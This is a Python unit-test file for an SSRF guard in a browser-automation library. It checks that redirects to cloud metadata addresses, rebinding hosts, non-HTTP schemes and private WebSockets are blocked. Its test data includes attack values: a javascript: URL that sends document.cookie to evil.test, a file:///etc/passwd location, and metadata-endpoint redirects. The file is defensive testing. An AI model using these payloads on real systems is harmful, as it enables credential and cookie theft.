# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""Unit coverage for the per-request guard.

The live tests prove the end-to-end block on real engines; these pin the
handler's own edges, which are awkward to provoke through a real browser.
"""

from __future__ import annotations

import socket
from typing import Any

import pytest

from octowright import ssrf
from octowright.ssrf_guard import MAX_REDIRECT_HOPS, _handle_route, _HopCounter


class _Response:
    def __init__(self, status: int, location: str | None = None) -> None:
        self.status = status
        self.status_text = "Found" if 300 <= status < 400 else "OK"
        self.headers = {"location": location} if location else {}


class _Request:
    def __init__(self, url: str, method: str = "GET", navigation: bool = True, frame: Any = None) -> None:
        self.url = url
        self.frame = frame if frame is not None else _Frame()
        self.method = method
        self.headers = {"content-type": "application/x-www-form-urlencoded", "accept": "text/html"}
        self._navigation = navigation

    def is_navigation_request(self) -> bool:
        return self._navigation


class _Frame:
    """Stands in for a Playwright Frame: hashable and weakly referenceable."""


class _Route:
    """Route double that replays a scripted chain and records the walk."""

    def __init__(self, chain: dict[str, _Response], request: _Request | None = None) -> None:
        self.chain = chain
        self.request = request
        self.fetched: list[str] = []
        self.fetch_methods: list[str] = []
        self.fetch_overrides: list[dict[str, Any]] = []
        self.aborted: str | None = None
        self.fell_back = False
        self.fulfilled: _Response | None = None
        self.fulfilled_body: dict[str, Any] | None = None

    async def fetch(self, url: str | None = None, *, max_redirects: int, **overrides: Any) -> _Response:
        assert max_redirects == 0, "a hop must never follow its own redirect"
        url = url or (self.request.url if self.request else "")
        self.fetched.append(url)
        self.fetch_methods.append(overrides.get("method") or (self.request.method if self.request else "GET"))
        self.fetch_overrides.append(overrides)
        return self.chain[url]

    async def fulfill(self, response: _Response | None = None, **body: Any) -> None:
        self.fulfilled = response
        self.fulfilled_body = body or None

    async def abort(self, reason: str) -> None:
        self.aborted = reason

    async def fallback(self) -> None:
        self.fell_back = True


@pytest.fixture(autouse=True)
def policy_on(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OCTOWRIGHT_SSRF_POLICY", "block-private")
    monkeypatch.setenv("OCTOWRIGHT_SSRF_ALLOW", "")
    # Every hop is now resolved; the doubles' *.test names answer public.
    monkeypatch.setattr(ssrf, "_getaddrinfo", _public_answer)
    monkeypatch.setattr(ssrf, "_subresource_verdicts", {})


def _public_answer(host: str, *_args: Any, **_kwargs: Any) -> list[Any]:
    if host == "rebind.test":
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", 0))]
    return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 0))]


async def _handle(route: _Route, request: _Request, hops: _HopCounter | None = None) -> None:
    await _handle_route(route, request, hops or _HopCounter())


async def test_a_plain_navigation_is_fetched_once_and_served_from_that_fetch() -> None:
    """Fulfilled with the response that was checked -- the browser never refetches it."""
    request = _Request("https://ok.test/")
    first = _Response(200)
    route = _Route({"https://ok.test/": first}, request)
    await _handle(route, request)
    assert route.fetched == ["https://ok.test/"]
    assert route.fulfilled is first
    assert not route.fell_back


async def test_a_redirect_to_a_blocked_host_is_aborted_before_it_is_fetched() -> None:
    request = _Request("https://public.test/")
    route = _Route({"https://public.test/": _Response(302, "http://169.254.169.254/latest/meta-data/")}, request)
    await _handle(route, request)
    assert route.aborted == "blockedbyclient"
    assert route.fetched == ["https://public.test/"]
    assert route.fulfilled is None and route.fulfilled_body is None


async def test_a_redirect_to_a_name_resolving_private_is_blocked() -> None:
    request = _Request("https://public.test/")
    route = _Route({"https://public.test/": _Response(302, "http://rebind.test/x")}, request)
    await _handle(route, request)
    assert route.aborted == "blockedbyclient"


async def test_a_clean_redirect_becomes_a_client_redirect_to_the_resolved_location() -> None:
    """Never the 3xx itself: the engine would follow it without calling the guard again."""
    request = _Request("https://public.test/a")
    route = _Route({"https://public.test/a": _Response(302, "/b")}, request)
    await _handle(route, request)
    assert route.fulfilled is None and route.aborted is None
    assert route.fulfilled_body is not None and route.fulfilled_body["status"] == 200
    assert 'location.replace("https://public.test/b")' in route.fulfilled_body["body"]
    assert route.fetched == ["https://public.test/a"]


async def test_a_redirect_without_a_location_is_served_as_is() -> None:
    request = _Request("https://public.test/")
    response = _Response(302)
    route = _Route({"https://public.test/": response}, request)
    await _handle(route, request)
    assert route.fulfilled is response


async def test_a_redirect_loop_is_bounded_per_frame() -> None:
    hops = _HopCounter()
    frame = _Frame()
    for _ in range(MAX_REDIRECT_HOPS):
        request = _Request("https://loop.test/", frame=frame)
        route = _Route({"https://loop.test/": _Response(302, "https://loop.test/")}, request)
        await _handle(route, request, hops)
        assert route.aborted is None
    request = _Request("https://loop.test/", frame=frame)
    route = _Route({"https://loop.test/": _Response(302, "https://loop.test/")}, request)
    await _handle(route, request, hops)
    assert route.aborted == "blockedbyclient"


async def test_a_served_page_resets_the_hop_count() -> None:
    hops = _HopCounter()
    frame = _Frame()
    for _ in range(MAX_REDIRECT_HOPS):
        for url, response in (
            ("https://a.test/", _Response(302, "https://a.test/end")),
            ("https://a.test/end", _Response(200)),
        ):
            request = _Request(url, frame=frame)
            route = _Route({url: response}, request)
            await _handle(route, request, hops)
            assert route.aborted is None


async def test_a_blocked_subresource_is_aborted_and_a_public_one_falls_through() -> None:
    blocked = _Route({})
    await _handle(blocked, _Request("http://127.0.0.1:9/x.png", navigation=False))
    assert blocked.aborted == "accessdenied" and blocked.fetched == []

    public = _Route({})
    await _handle(public, _Request("https://cdn.test/x.png", navigation=False))
    assert public.fell_back and public.fetched == []

    resolved = _Route({})
    await _handle(resolved, _Request("https://rebind.test/x.png", navigation=False))
    assert resolved.aborted == "accessdenied"


async def test_subresource_hosts_are_resolved_once_per_ttl(monkeypatch: pytest.MonkeyPatch) -> None:
    """A page with many requests to one host pays one lookup, even concurrently."""
    import asyncio

    lookups: list[str] = []

    def counting(host: str, *args: Any, **kwargs: Any) -> list[Any]:
        lookups.append(host)
        return _public_answer(host, *args, **kwargs)

    monkeypatch.setattr(ssrf, "_getaddrinfo", counting)
    routes = [_Route({}) for _ in range(25)]
    await asyncio.gather(
        *(_handle(r, _Request(f"https://cdn.test/{i}.png", navigation=False)) for i, r in enumerate(routes))
    )
    assert all(r.fell_back for r in routes)
    assert lookups == ["cdn.test"]

    monkeypatch.setattr(ssrf.time, "monotonic", lambda: 1e12)  # far past the TTL
    await _handle(_Route({}), _Request("https://cdn.test/again.png", navigation=False))
    assert lookups == ["cdn.test", "cdn.test"]


async def test_an_allowlisted_subresource_host_is_never_resolved(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OCTOWRIGHT_SSRF_ALLOW", "internal.test")

    def refuse(*_args: Any, **_kwargs: Any) -> list[Any]:
        raise AssertionError("an allowlisted host was resolved")

    monkeypatch.setattr(ssrf, "_getaddrinfo", refuse)
    route = _Route({})
    await _handle(route, _Request("https://internal.test/x.png", navigation=False))
    assert route.fell_back


async def test_post_navigation_is_sent_once_and_fulfilled() -> None:
    """Chain-checking a POST must not double-submit the form."""
    request = _Request("https://x.test/login", method="POST")
    route = _Route({"https://x.test/login": _Response(200)}, request)
    await _handle(route, request)
    assert route.fetched == ["https://x.test/login"]
    assert route.fulfilled is not None and not route.fell_back


@pytest.mark.parametrize("status", [303, 302, 301])
async def test_post_redirect_to_a_blocked_host_is_aborted(status: int) -> None:
    """POST -> 30x -> metadata: the browser would follow with a GET."""
    request = _Request("https://x.test/login", method="POST")
    route = _Route({"https://x.test/login": _Response(status, "http://169.254.169.254/latest/meta-data/")}, request)
    await _handle(route, request)
    assert route.aborted == "blockedbyclient"
    assert route.fetched == ["https://x.test/login"]
    assert route.fulfilled is None


@pytest.mark.parametrize("status", [303, 302, 301])
async def test_clean_post_redirect_becomes_a_get_navigation_through_the_guard(status: int) -> None:
    """The POST went out once; the next hop is a new navigation the guard fetches itself."""
    request = _Request("https://x.test/login", method="POST")
    route = _Route({"https://x.test/login": _Response(status, "/done")}, request)
    await _handle(route, request)
    assert route.fetch_methods == ["POST"]
    assert route.fulfilled_body is not None and "https://x.test/done" in route.fulfilled_body["body"]
    assert route.aborted is None


@pytest.mark.parametrize("status", [307, 308])
async def test_method_preserving_post_redirect_is_aborted_even_when_public(status: int) -> None:
    """Later hops would re-send the body and never reach this handler."""
    request = _Request("https://x.test/login", method="POST")
    route = _Route({"https://x.test/login": _Response(status, "https://x.test/elsewhere")}, request)
    await _handle(route, request)
    assert route.aborted == "blockedbyclient"
    assert route.fetched == ["https://x.test/login"]


async def test_navigation_url_itself_is_checked() -> None:
    """A page-initiated navigation was never pre-flighted by a tool."""
    route = _Route({})
    await _handle(route, _Request("http://rebind.test/"))
    assert route.aborted == "blockedbyclient"
    assert route.fetched == []


async def test_websockets_are_routed_too() -> None:
    """``context.route`` never sees a WebSocket; ``route_web_socket`` does."""
    from octowright.ssrf_guard import install_navigation_guard

    registered: list[str] = []

    class _Ctx:
        async def route(self, *_args: Any) -> None:
            registered.append("route")

        async def route_web_socket(self, pattern: Any, _handler: Any) -> None:
            assert pattern.match("ws://anything.test:1/x"), "the pattern must match ws:// URLs"
            registered.append("route_web_socket")

    await install_navigation_guard(_Ctx())
    assert registered == ["route", "route_web_socket"]


class _WebSocketRoute:
    def __init__(self, url: str) -> None:
        self.url = url
        self.closed = False
        self.connected = False

    async def close(self) -> None:
        self.closed = True

    def connect_to_server(self) -> None:
        self.connected = True


@pytest.mark.parametrize(
    ("url", "blocked"),
    [("ws://127.0.0.1:9/", True), ("wss://rebind.test/", True), ("wss://public.test/socket", False)],
)
async def test_a_websocket_is_closed_or_connected_by_verdict(url: str, blocked: bool) -> None:
    from octowright.ssrf_guard import _handle_websocket

    ws = _WebSocketRoute(url)
    await _handle_websocket(ws)
    assert (ws.closed, ws.connected) == (blocked, not blocked)


@pytest.mark.parametrize(
    "location",
    [
        "javascript:fetch('//evil.test/?c='+document.cookie)",
        "JavaScript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "blob:https://public.test/0f0e0d0c-0000-0000-0000-000000000000",
        "file:///etc/passwd",
        "about:blank",
    ],
)
async def test_a_redirect_to_a_non_http_scheme_is_refused_before_any_document(location: str) -> None:
    """A browser treats a 3xx to any non-HTTP(S) scheme as a network error.

    Served as a client redirect instead, ``javascript:`` ran as script in the
    redirecting URL's origin -- the scheme passed the host check because the
    policy has no host to check for it.
    """
    request = _Request("https://trusted.test/open-redirect")
    route = _Route({"https://trusted.test/open-redirect": _Response(302, location)}, request)
    await _handle(route, request)
    assert route.aborted == "blockedbyclient"
    assert route.fulfilled is None and route.fulfilled_body is None


async def _hop(hops: _HopCounter, frame: _Frame, url: str, response: _Response | None) -> _Route:
    """One navigation in *frame*; ``None`` makes its fetch fail."""
    request = _Request(url, frame=frame)
    route = _Route({url: response} if response is not None else {}, request)
    if response is None:

        async def failing(*_args: Any, **_kwargs: Any) -> _Response:
            raise RuntimeError("connection reset")

        route.fetch = failing  # type: ignore[method-assign]
    await _handle(route, request, hops)
    return route


@pytest.mark.parametrize("ending", ["blocked", "failed"])
async def test_a_chain_that_ends_in_an_abort_does_not_count_against_the_next(ending: str) -> None:
    """18 hops and then a refusal or a failed fetch: the next 3-hop chain is its own."""
    hops = _HopCounter()
    frame = _Frame()
    for i in range(MAX_REDIRECT_HOPS - 2):
        assert (
            await _hop(hops, frame, f"https://a.test/{i}", _Response(302, f"https://a.test/{i + 1}"))
        ).aborted is None
    last = f"https://a.test/{MAX_REDIRECT_HOPS - 2}"
    if ending == "blocked":
        end = await _hop(hops, frame, last, _Response(302, "http://169.254.169.254/"))
        assert end.aborted == "blockedbyclient"
    else:
        end = await _hop(hops, frame, last, None)
        assert end.aborted == "failed"
    for step in ("https://sso.test/1", "https://sso.test/2", "https://sso.test/3"):
        route = await _hop(hops, frame, step, _Response(302, step + "x"))
        assert route.aborted is None, f"{step} was refused: the aborted chain's hops were still counted"


async def test_a_request_without_a_frame_is_logged_not_silently_skipped(monkeypatch: pytest.MonkeyPatch) -> None:
    from octowright import ssrf_guard

    class _Frameless:
        @property
        def frame(self) -> Any:
            raise RuntimeError("service worker")

    seen: list[str] = []

    class _Log:
        def debug(self, event: str, **_kw: Any) -> None:
            seen.append(event)

    monkeypatch.setattr(ssrf_guard, "log", _Log())
    assert _HopCounter._frame(_Frameless()) is None
    assert seen == ["octowright.ssrf.request_without_frame"]
